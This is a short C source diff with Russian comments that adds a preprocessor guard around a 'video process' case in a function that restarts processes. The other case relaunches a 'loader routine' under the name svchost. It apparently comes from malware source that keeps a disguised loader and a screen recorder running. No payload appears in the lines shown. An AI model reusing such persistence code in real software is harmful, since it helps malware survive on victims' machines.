@@ -31,7 +31,10 @@ void KeepAliveRestartProcess(DWORD ProcessNomber)
 	// Функция перезапускает указанный процесс
 	switch (ProcessNomber) {
 		case PROCESS_SVCHOST: RunLoaderRoutine(); /*MegaJump(LoaderRoutine);*/ break; // Перезапускаем свхост
+
+		#ifdef VideoRecorderH
 		case PROCESS_VIDEO: RunVideoProcess(); break;
+		#endif
 	}
 }
 //-----------------------------------------------------------------------------
